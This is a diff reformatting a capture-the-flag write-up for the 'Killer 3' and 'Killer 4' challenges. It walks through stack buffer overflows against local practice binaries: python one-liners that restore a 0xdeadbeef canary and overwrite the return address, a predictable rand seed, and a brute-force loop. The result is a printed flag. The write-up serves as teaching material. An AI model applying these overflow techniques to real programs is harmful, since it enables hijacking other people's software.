@@ -149,29 +149,37 @@ This lets us know that our give flag was 0x41414141, which is the 'A's that we p
 
 
 ## Killer 3
- Solution: `python3 -c 'import sys; import struct; val = struct.pack("I", 0xdeadbeef); rVal = struct.pack("I", 0x555552a4); rVal2 = struct.pack("I", 0x00005555); sys.stdout.buffer.write(b"A" * 8 + val + b"A" * 168 + rVal + rVal2)' | ./level3`
+ Solution: 
+ ```
+ python3 -c 'import sys; import struct; val = struct.pack("I", 0xdeadbeef); 
+ rVal = struct.pack("I", 0x555552a4); rVal2 = struct.pack("I", 0x00005555); 
+ sys.stdout.buffer.write(b"A" * 8 + val + b"A" * 168 + rVal + rVal2)' | ./level3
+ ```
  
  
  As before, the first thing we do is try and overflow the buffer and we see we kill the bird again
  
 
 `python3 -c "print('A'*1000)" | ./level3`
-> Here's my favorite bird, what do you think his name is:
+```
+Here's my favorite bird, what do you think his name is:
 You killed my birdy, it was 0xdeadbeef but you killed him so now he's 0x41414141
 I will make you pay for that
-
+```
 
 So we do some guess and check to figure out how many A's are needed to overwrite the bird to make it deadbeef again. This happens to be 8 A's and then we output dead beef again to get pass it.
 
 So we run it again overflowing after the canary and get this:
 
 `python3 -c "print('A" * 8 + val + b"A" * 200 + rVal + rVal2)' | ./level3`
-> Here's my favorite bird, what do you think his name is:
+```
+Here's my favorite bird, what do you think his name is:
 Oh my birdy likes you: 0xdeadbeef thinks you're a nice person so you can stay for now
 Here let me show you to 0x4141414141414141
 Caught segfault at address (nil)
 You seem to be struggling
 Here's a pointer that you may want to check it out: 0x00005555555552a4
+```
 
 We see we are going to 0x4141414141414141 in the code and it tells use we want to go to  0x00005555555552a4. 
 
@@ -191,7 +199,7 @@ for i in {0..10000}; do python3 -c 'import sys; import struct; val = struct.pack
 
 Ok For our first steps lets walk through the program and we get:
 
-`
+```
 
 
 Welcome victim 2015962150
@@ -210,7 +218,7 @@ I'll remember that
 
 Before you die, Do you want to know how I name my birds?? (y/n):
 y
-
+```
 ```C
 get_birdy(int iters){
     srand(1337);
@@ -229,16 +237,16 @@ We see a couple of interesting things here. First there seems to be a large numb
 
 The get_brirdy function uses the stand and rand functions to get the name of the bird, which is pretty interesting. Rand in C is a [[pseudo random number]] generator which means that if we have the seed we know what series of numbers it will produce. Luckally, we can see the seed in this code. The srand function sets the seed of rand to the given value, 1337 in our case. However, we do not know the number of iterations because that is a given to the function. So lets overflow the first input.
 
-`
+```
 ./level4
 Welcome victim 1218289084
  hahahahahaha:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 How dare you, You killed my birdy, sad dead birdy,  
  His name was 0x4fac9884 but you killed him and now it's 0x41414141
 You'll never leave here now
-`
+```
 This doesn't give us too much interesting information so lets also overflow the 2nd input.
-`
+```
 ./level4
 Welcome victim 734924384
  hahahahahaha:a
@@ -260,7 +268,7 @@ Since you're trying here's a sneek peak at main (I'm still hiding some stuff tho
 
 
 
-`
+````
 ```C
 
 void try_to_escape(){
@@ -305,18 +313,18 @@ We also see that the contestant number is printed off which was assigned in get_
 
 Once we overflow the buffer and preserve the canary, it tells us to go to a pointer location and where we are currently going:
 
-`
+```
 My bird still lives :) so I guess I'll give you one more chance
 
 To escape you must goto 0x5555555553c6
 
 Now we are going to 0x414141414141414141414141
  will you survive?
-`
+```
 
 At this point we simply expirement a little more  to figure out the offset to control the return address of the program and then create 2 structs to overwrite it to the value we want to get the following:
 
-`
+```
 My bird still lives :) so I guess I'll give you one more chance
 
 To escape you must goto 0x5555555553c6
@@ -325,7 +333,7 @@ Now we are going to 0x5555555553c6
  Damn you, you escaped with my flag:
  s00ky_ctf{7h3_l0N3_5UrvIv3R_W3ll_d0N3}
 
-`
+```
 
 I was in a rush to make a solution to prove that this was exploitable before the competition, so rather then trying to do something elegant with getting the canary right every time, I simply brute forced it with my bash one liner. Not perfect but it works.
 
